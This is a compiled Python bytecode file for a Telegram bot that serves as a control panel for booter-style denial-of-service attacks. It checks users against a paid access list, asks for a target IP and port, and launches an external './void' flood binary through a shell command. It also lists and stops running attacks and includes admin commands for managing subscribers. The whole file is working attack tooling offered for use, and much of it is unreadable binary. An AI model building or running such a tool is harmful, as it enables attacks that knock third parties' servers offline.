U
    �6g�;  �                	   @   s�  d dl Z d dlmZmZ d dlZd dlZd dlmZmZ d dlZd dl	Z	d dl
Z
d dlZd dlZeddd�ZdZdZd	Zd
d� Zdd� Zi Zz&edd��Ze�� �� ZW 5 Q R X W n" ek
r�   ed� e�  Y nX es�ed� e�  e �e�Zej�ej� e!�d�Z"dd� Z#e#� Z$dddddddhZ%i Z&i Z'dd� Z(dd� Z)d d!� Z*d"d#� Z+d$d%� Z,d&d'� Z-d(d)� Z.d*d+� Z/d,d-� Z0d.d/� Z1ej2d0d1� d2�d3d4� �Z3ej2d5d1� d2�d6d7� �Z4ej2d8gd9�d:d;� �Z5ej2d<gd9�d=d>� �Z6ej2d?gd9�d@dA� �Z7ej2dBgd9�dCdD� �Z8dEdF� Z9dGdH� Z:dIdJ� Z;ej2dKd1� d2�dLdM� �Z<ej2dNd1� d2�dOdP� �Z=ej2dQd1� d2�dRdS� �Z>ej2dTd1� d2�dUdV� �Z?ej2dWgd9�dXdY� �Z@ej2dZd1� d2�d[d\� �ZAd]d^� ZBeB�  dS )_�    N)�ReplyKeyboardMarkup�KeyboardButton)�datetime�	timedeltai�  �
   �   s(   Qm90IGhhcyBleHBpcmVkIGJ5IEBWT0lEQ0hFQVRash   V2VsY29tZSB0byB0aGUgYm90ISBQbGVhc2UgY2hvb3NlIGFuIG9wdGlvbiBmcm9tIHRoZSBtZW51IGJlbG93IEBWT0lEQ0hFQVRaOg==s4   V2VsY29tZSB0byBBZG1pbiBDb21tYW5kcyBAVk9JRENIRUFUWjo=c                   C   s    t �� tkrttt�� dS dS )NTF)r   �now�expiration_date�print�decode_message�encoded_expiry_message� r   r   �v.py�check_expiration   s    r   c                 C   s   t �| ��d�S )Nzutf-8)�base64Z	b64decode�decode)Zencoded_messager   r   r   r      s    r   z	token.txt�rz]Error: token.txt file not found. Please make sure the file exists and contains the bot token.zIError: API token is missing. Please add your token to the token.txt file.z	users.txtc               	   C   sT   z.t dd��} dd� | �� D �}W 5 Q R X |W S  tk
rN   td� g  Y S X d S )Nz	Admin.txtr   c                 S   s   g | ]}t |�� ��qS r   )�int�strip)�.0�liner   r   r   �
<listcomp>5   s     z+get_admin_ids_from_file.<locals>.<listcomp>z Error: Admin.txt file not found.)�open�	readlines�FileNotFoundErrorr
   )�fileZ	admin_idsr   r   r   �get_admin_ids_from_file2   s    r   i�!  i N  i�  i\D  iG#  i"N  i!N  c                 C   s4   t �d�}| �d�}t|�| ��o2tdd� |D ��S )Nz^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$�.c                 s   s*   | ]"}d t |�  kodkn  V  qdS )r   ��   N)r   )r   �partr   r   r   �	<genexpr>D   s     zis_valid_ip.<locals>.<genexpr>)�re�compile�split�bool�match�all)�ip�pattern�partsr   r   r   �is_valid_ipA   s    

r*   c                 C   s   t | �tkS �N)r   �blocked_ports)�portr   r   r   �is_port_blockedG   s    r.   c               	   C   s�   g } i }zpt td��\}|�� }|D ]H}|�� �d�\}}t�|d�}|t�� kr"| �t	|�� ||t	|�< q"W 5 Q R X W n t
k
r�   td� Y nX | |fS )Nr   �,�%Y-%m-%d %H:%M:%Sz*Users file not found, no users authorized.)r   �USERS_FILE_PATHr   r   r#   r   �strptimer   �appendr   r   r
   )�authorized_users�expiry_datesr   �linesr   �user_idZexpiry_date_str�expiry_dater   r   r   �load_authorized_usersK   s    r9   c              	   C   s6   t td��"}|�| � d|�d�� d�� W 5 Q R X d S )N�ar/   r0   �
)r   r1   �write�strftime)r7   r8   r   r   r   r   �save_authorized_user\   s    r>   c              
   C   s�   zpt td��}|�� }W 5 Q R X t td��<}|D ]0}|�� �d�\}}t|�t| �kr0|�|� q0W 5 Q R X W dS  tk
r� } ztd|� �� W Y �dS d }~X Y nX d S )Nr   �wr/   TzError removing user: F)	r   r1   r   r   r#   r   r<   �	Exceptionr
   )r7   r   r6   r   Zstored_user_id�_�er   r   r   �remove_user_by_ida   s    rC   c               
   C   sP   zt td���  W dS  tk
rJ }  ztd| � �� W Y �dS d } ~ X Y nX d S )Nr?   TzError removing all users: F)r   r1   �closer@   r
   �rB   r   r   r   �remove_all_usersp   s    rF   c                 C   s   | t kS r+   )�	ADMIN_IDS)r7   r   r   r   �is_adminy   s    rH   c              
   C   s�   z\t j|dt jt jtjd�}|j}||dd�t|< tj| d|� d|� d|� d|� �d	d
� W n> t j	k
r� } ztj| dt
|�� �d	d
� W 5 d }~X Y nX d S )NT)�shell�stdout�stderrZ
preexec_fn�running)�pid�command�statusu'   ✅ *Attack started!*

👤 *User ID:* u   
🌐 *IP:* u   
🔌 *Port:* �   
🔹 *Process ID (PID):* �Markdown�Z
parse_modeu.   ❌ *Failed to execute the attack.*

*Error:* )�
subprocess�Popen�PIPE�os�setsidrM   �running_processes�bot�send_messageZCalledProcessError�str)�chat_idr7   r'   r-   rN   ZprocessrM   rB   r   r   r   �execute_attack_async}   s     �
r]   c                 C   s6   d|� d|� d�}t jt| ||||fd�}|��  d S )Nz./void � z
 999999 20)�target�args)�	threadingZThreadr]   �start)r\   r7   r'   r-   rN   �threadr   r   r   �start_attack�   s    rd   c              
   C   s�   | t kr�t |  d dkr�t |  d }z,t�t�|�tj� dt |  d< d|� �W S  tk
r� } zdt|�� � W Y �S d }~X Y q�X ndS d S )NrO   rL   rM   Zstoppedu0   🛑 *Attack stopped!*
🔹 *Process ID (PID):* u+   ❌ *Failed to stop the attack.*

*Error:* u2   ❌ *No running attacks to stop for your account.*)rX   rV   �killpg�getpgid�signal�SIGTERMr@   r[   )r7   rM   rB   r   r   r   �stop_attack�   s    &ri   c                 C   s
   | j dkS )N�   ⚔️ Attack��text��messager   r   r   �<lambda>�   �    ro   )�funcc                 C   sD   | j j}t� \}}t|�s"||kr,t| � ntj| jjddd� d S )Nu9   🚫 *You're not authorized to use the 'Attack' command.*rQ   rR   )�	from_user�idr9   rH   �
ask_for_iprY   rZ   �chat�rn   r7   r4   rA   r   r   r   �handle_attack_command�   s
    

rw   c                 C   s
   | j dkS )N�	ADMIN CMDrk   rm   r   r   r   ro   �   rp   c                 C   s    t | jj�rt�| jjd� d S )NzoWelcome to Admin Commands @VOIDCHEATZ. You can use:
/add [userid]
/remove [userid]
/listalluser
/removeallusers)rH   rr   rs   rY   rZ   ru   rm   r   r   r   �	admin_cmd�   s    ry   �add)Zcommandsc              
   C   s�   t | jj�r�zp| j�� }t|�dk r:t�| jjd� W d S t	|d �}t
�� tdd� }t||� t�| jjd|� d�� W nZ tk
r�   t�| jjd� Y n8 tk
r� } zt�| jjd	|� �� W 5 d }~X Y nX d S )
N�   u9   ❌ Please provide a user ID to add. Usage: /add [userid]�   �   )Zdays�
   ✅ User `z` added successfully!�>   ❌ Invalid user ID. Please provide a valid numerical user ID.u   ❌ Error adding user: )rH   rr   rs   rl   r#   �lenrY   rZ   ru   r   r   r   r   r>   �
ValueErrorr@   )rn   r)   r7   r8   rB   r   r   r   �add_user�   s    

r�   �removec              
   C   s�   t | jj�r�zn| j�� }t|�dk r:t�| jjd� W d S t	|d �}t
|�rht�| jjd|� d�� nt�| jjd� W nZ tk
r�   t�| jjd� Y n8 tk
r� } zt�| jjd|� �� W 5 d }~X Y nX d S )	Nr{   u?   ❌ Please provide a user ID to remove. Usage: /remove [userid]r|   r~   z` removed successfully!u   ❌ Error removing user.r   u   ❌ Error removing user: )rH   rr   rs   rl   r#   r�   rY   rZ   ru   r   rC   r�   r@   )rn   r)   r7   rB   r   r   r   �remove_user�   s    
r�   Zlistalluserc                 C   sZ   t | jj�rVt� \}}|rFd�dd� |D ��}t�| jjd|� �� nt�| jjd� d S )Nr;   c                 s   s   | ]}t |�V  qd S r+   )r[   )r   �userr   r   r   r    �   s     z!list_all_users.<locals>.<genexpr>zAuthorized Users:
zNo authorized users.)rH   rr   rs   r9   �joinrY   rZ   ru   )rn   r4   rA   Z	user_listr   r   r   �list_all_users�   s    
r�   Zremoveallusersc                 C   s8   t | jj�r4t� r$t�| jjd� nt�| jjd� d S )Nu#   ✅ All users removed successfully!u   ❌ Error removing all users.)rH   rr   rs   rF   rY   rZ   ru   rm   r   r   r   �remove_all_users_handler�   s    r�   c                 C   s$   t j| jjddd� t �| t� d S )Nu#   🌐 *Please enter the IP address:*rQ   rR   )rY   rZ   ru   rs   �register_next_step_handler�get_iprm   r   r   r   rt   �   s    rt   c                 C   s`   | j }t|�s&tj| jjddd� d S || jjd�t| jj< tj| jjddd� t�| t	� d S )Nu2   ❌ *Invalid IP address. Please enter a valid IP.*rQ   rR   )r'   r7   u1   🔌 *Got it! Now, please enter the Port number:*)
rl   r*   rY   rZ   ru   rs   rr   �	user_datar�   �get_port)rn   r'   r   r   r   r�   �   s    �r�   c                 C   st   | j }t|�r.tj| jjd|� d�dd� d S |t| jj d< t| jj d }t| jj d }t| jj|||� d S )Nu   🚫 *Port z* is blocked. Please use a different port.*rQ   rR   r-   r7   r'   )rl   r.   rY   rZ   ru   rs   r�   rd   )rn   r-   r7   r'   r   r   r   r�   �   s    r�   c                 C   s
   | j dkS )N�   🚀 Running Attacksrk   rm   r   r   r   ro     rp   c                 C   s�   | j j}t� \}}t|�s"||kr~|tkrlt| d dkrlt| }tj| jjd|d � d|d � �dd� q�t�| jjd	� nt�| jjd
� d S )NrO   rL   u+   🚀 *Attack is running!*

💻 *Command:* rN   rP   rM   rQ   rR   u*   ❌ *No running attacks for your account.*u5   🚫 *You're not authorized to view running attacks.*)rr   rs   r9   rH   rX   rY   rZ   ru   )rn   r7   r4   rA   Zattack_infor   r   r   �running_attacks  s    
 �r�   c                 C   s
   | j dkS )N�	   🛑 Stoprk   rm   r   r   r   ro     rp   c                 C   sT   | j j}t� \}}t|�s"||kr@t|�}tj| jj|dd� nt�| jjd� d S )NrQ   rR   u-   🚫 *You're not authorized to stop attacks.*)rr   rs   r9   rH   ri   rY   rZ   ru   )rn   r7   r4   rA   Zresponser   r   r   �stop_attack_handler  s    
r�   c                 C   s
   | j dkS )N�   🆔 Get IDrk   rm   r   r   r   ro     rp   c                 C   s"   t j| jjd| jj� �dd� d S )Nu   🆔 *Your Telegram ID is:* rQ   rR   )rY   rZ   ru   rs   rr   rm   r   r   r   �get_user_id  s    r�   c                 C   s
   | j dkS )N�   ℹ️ My Infork   rm   r   r   r   ro   $  rp   c                 C   s�   | j j}| j jr| j jnd}t� \}}||krXd}|| }d|� d|� d|� d|� �}nd}d|� d|� d|� �}tj| jj|dd	� d S )
NzN/Au   💎 *Prime Member*u   👤 *User ID:* u   
📛 *Username:* @u   
💼 *User Type:* u   
🕒 *Expiry Date:* u   🧑 *Regular Member*rQ   rR   )rr   rs   �usernamer9   rY   rZ   ru   )rn   r7   r�   r4   r5   Z	user_typer8   �infor   r   r   �my_info$  s    
r�   rb   c                 C   s�   t � rt�| jjd� d S tdd�}td�}td�}td�}td�}td�}td	�}t| jj�rrtd
�}|�	|� t
� \}	}
t| jj�s�| jj|	kr�|�	||||||� tj| jjtt�|d� nt�| jjd� d S )Nu5   🚫 *The bot has expired and can no longer be used.*T)Zresize_keyboardrj   r�   r�   r�   r�   �DOWNLOAD CANARYrx   )Zreply_markupu7   🚫 *You're not authorized to use the bot's features.*)r   rY   rZ   ru   rs   r   r   rH   rr   rz   r9   r   �encoded_welcome_message)rn   ZmarkupZbutton_attackZbutton_runningZbutton_stopZ	button_idZbutton_infoZbutton_download_canaryZbutton_admin_cmdr4   rA   r   r   r   �send_welcome8  s$    


r�   c                 C   s
   | j dkS )Nr�   rk   rm   r   r   r   ro   U  rp   c                 C   sL   | j j}t� \}}t|�s"||kr8tj| jjddd� nt�| jjd� d S )Nz@Download the Canary: [Click Here](https://t.me/CANARYDOWNLOAD/7)rQ   rR   u4   🚫 *You're not authorized to download the Canary.*)rr   rs   r9   rH   rY   rZ   ru   rv   r   r   r   �download_canaryU  s
    
r�   c               
   C   sb   t � rt�  d S zt��  W n@ tk
r\ }  z"td| � �� t�d� t�  W 5 d } ~ X Y nX d S )NzError occurred during polling: �   )	r   Zprint_expired_messagerY   Zpollingr@   r
   �time�sleep�start_bot_pollingrE   r   r   r   r�   _  s    
r�   )CZtelebotZtelebot.typesr   r   rS   rV   r   r   ra   rg   r!   r�   r   r	   r   r�   Zencoded_admin_messager   r   r�   r   r   �readr   Z	API_TOKENr   r
   �exitZTeleBotrY   �pathr�   �dirname�__file__r1   r   rG   r,   rX   r4   r*   r.   r9   r>   rC   rF   rH   r]   rd   ri   Zmessage_handlerrw   ry   r�   r�   r�   r�   rt   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   r   r   �<module>   s�   
		
	












	